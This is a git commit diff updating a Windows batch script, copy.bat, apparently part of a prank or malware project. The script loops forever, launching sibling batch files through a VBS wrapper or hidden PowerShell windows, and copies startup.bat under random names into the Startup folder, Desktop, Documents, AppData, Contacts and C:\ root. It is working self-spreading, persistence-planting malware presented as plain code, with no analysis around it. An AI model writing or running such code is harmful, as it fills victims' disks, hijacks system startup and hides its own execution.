36fc39fc4ad6e946e9c3a1428c9049719f40182a
AXL.Alixx <58485851+axlalixx@users.noreply.github.com>
2024-12-20 02:51:00 +0000

    Update copy.bat

--- copy.bat
+++ copy.bat
@@ -1,14 +1,31 @@
 @echo off
+
+setlocal
+set "vbsFile=%PUBLIC%\vbs\file.vbs"
+
 :loop
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\d%random%d.bat
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\filel.bat
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\file.bat
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\sigma.bat
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\copy.bat
-wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\startup.bat
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Documents\mk%random%4.bat
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Desktop\mk%random%4.bat
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\mk%random%4.bat
-copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Contacts\mk%random%4.bat
-copy %PUBLIC%\sigma\startup.bat C:\mk%random%4.bat
+
+if exist "%vbsFile%" (
+    wscript "%vbsFile%" "%PUBLIC%\sigma\filel.bat"
+    wscript "%vbsFile%" "%PUBLIC%\sigma\file.bat"
+    wscript "%vbsFile%" "%PUBLIC%\sigma\sigma.bat"
+    wscript "%vbsFile%" "%PUBLIC%\sigma\copy.bat"
+    wscript "%vbsFile%" "%PUBLIC%\sigma\startup.bat"
+    wscript "%vbsFile%" "%PUBLIC%\sigma\lulz.bat"
+) else (
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\file.bat"
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\sigma.bat"
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\copy.bat"
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\startup.bat"
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\filel.bat"
+    powershell -WindowStyle Hidden -File "%PUBLIC%\sigma\lulz.bat"
+)
+
+copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\d%random%.bat"
+copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\Documents\mk%random%4.bat"
+copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\Desktop\mk%random%4.bat"
+copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\AppData\mk%random%4.bat"
+copy "%PUBLIC%\sigma\startup.bat" "%USERPROFILE%\Contacts\mk%random%4.bat"
+copy "%PUBLIC%\sigma\startup.bat" "C:\mk%random%4.bat"
+
 goto loop
